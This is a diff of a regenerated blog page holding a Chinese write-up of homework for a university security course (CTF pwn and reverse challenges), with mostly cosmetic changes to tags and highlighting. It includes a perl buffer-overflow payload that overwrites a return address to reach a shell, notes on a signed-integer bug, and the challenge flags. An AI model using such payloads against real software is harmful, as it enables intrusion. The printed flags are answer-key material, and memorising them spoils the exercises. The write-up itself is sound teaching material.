@@ -8,7 +8,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/earlyaccess/notosanstc.css">
   <meta name="description" content="前言這堂課是台大、台科大、交大、中央(?聯合的資安課程今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記 課程網站：https://csie.ctf.tw [hw0] Pwn 10x400566有個callme()裡頭就是system(&amp;quot;/bin/sh&amp;quot;)overflow蓋r">
-<meta name="keywords" content="筆記,CTF,Pwn,NTU">
+<meta name="keywords" content="CTF,Pwn,NTU,筆記">
 <meta property="og:type" content="article">
 <meta property="og:title" content="EDU-CTF 計算機安全">
 <meta property="og:url" content="http://blog.kaibro.tw/2017/10/15/EDU-CTF-計算機安全/index.html">
@@ -73,7 +73,7 @@
 						<li>Tags</li>
 						
 						
-						<li>Über</li>
+						<li>A propos</li>
 						
 					</ul>
 				</div>
@@ -108,7 +108,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18px;">CTF</a> <a href="/tags/Linux/" style="font-size: 12px;">Linux</a> <a href="/tags/NCU/" style="font-size: 14px;">NCU</a> <a href="/tags/NTU/" style="font-size: 12px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 16px;">Pwn</a> <a href="/tags/Web/" style="font-size: 16px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
+						<a href="/tags/BugBounty/" style="font-size: 10px;">BugBounty</a> <a href="/tags/CTF/" style="font-size: 18.33px;">CTF</a> <a href="/tags/Linux/" style="font-size: 11.67px;">Linux</a> <a href="/tags/NCU/" style="font-size: 13.33px;">NCU</a> <a href="/tags/NTU/" style="font-size: 11.67px;">NTU</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/Web/" style="font-size: 16.67px;">Web</a> <a href="/tags/筆記/" style="font-size: 20px;">筆記</a> <a href="/tags/開箱/" style="font-size: 10px;">開箱</a> <a href="/tags/開箱文/" style="font-size: 10px;">開箱文</a>
 					</div>
 				</section>
 				
@@ -210,11 +210,11 @@
         <h2 id="u524D_u8A00"><a href="#u524D_u8A00" class="headerlink" title="前言"></a>前言</h2><p>這堂課是台大、台科大、交大、中央(?聯合的資安課程<br>今年全上pwn跟reverse，跟前年不太一樣(前年還有教Web、Crypto…等)<br>這一篇文章主要放這門課作業和練習的Write up，記錄一下解法怕忘記</p>
 <p>課程網站：<a href="https://csie.ctf.tw" target="_blank" rel="external">https://csie.ctf.tw</a></p>
 <h2 id="5Bhw0_5D_Pwn_1"><a href="#5Bhw0_5D_Pwn_1" class="headerlink" title="[hw0] Pwn 1"></a>[hw0] Pwn 1</h2><p>0x400566有個<code>callme()</code><br>裡頭就是<code>system(&quot;/bin/sh&quot;)</code><br>overflow蓋return address跳過去即可get shell<br>padding長度40</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;A&quot;x40, &quot;\x66\x05\x40\x00\x00\x00\x00\x00&quot;&apos;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;BuFFer_0V3Rflow_is_too_easy&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e 'print "A"x40, "<span class="symbol">\x</span>66<span class="symbol">\x</span>05<span class="symbol">\x</span>40<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00"'</div></pre></td></tr></table></figure>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;BuFFer<span class="number">_0</span>V<span class="number">3</span>Rflow<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>too<span class="number">_</span>easy&#125;</div></pre></td></tr></table></figure>
 <a id="more"></a>
 <h2 id="5Bhw0_5D_Rev_1"><a href="#5Bhw0_5D_Rev_1" class="headerlink" title="[hw0] Rev 1"></a>[hw0] Rev 1</h2><p>在0x8048420有個<code>print_flag()</code><br>用gdb跑，在main先下斷點，讓他停住<br>然後直接<code>set $eip=0x8048420</code> 跑printf_flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG&#123;_reverse_is_fun&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">FLAG</span>&#123;<span class="variable">_reverse_is_fun</span>&#125;</div></pre></td></tr></table></figure>
 <h2 id="5Bhw0_5D_Rev_2"><a href="#5Bhw0_5D_Rev_2" class="headerlink" title="[hw0] Rev 2"></a>[hw0] Rev 2</h2><p>丟ida pro看一下<br>可發現它會把輸入的字串的每個字元都跟0xcc做XOR<br>然後結果會拿去跟某個字串做比較<br>比較相同會跳Congret<br>所以基本上就可以猜測，那個拿來跟輸入比較的字串就是XOR過的FLAG<br>直接整串每個字元拿去做XOR 0xcc即可還原FLAG</p>
 <h2 id="5Bhw0_5D_BubbleSort"><a href="#5Bhw0_5D_BubbleSort" class="headerlink" title="[hw0] BubbleSort"></a>[hw0] BubbleSort</h2><p>這題有個<code>DarkSoul()</code>，裡頭是<code>system(&quot;sh&quot;)</code><br>所以目標很明顯，想辦法讓程式流程跑到這即可<br>在輸入要sort幾個數字的地方，可以輸入有號整數<br>可以輸入負數！<br>但傳進BubbleSort後，卻被當成無號整數來處理<br>例如-125會變130</p>
 <p>所以排序時，有可能把array以外的記憶體抓出來比較<br>構造一下就能把某個值排到stack上的特定位置</p>
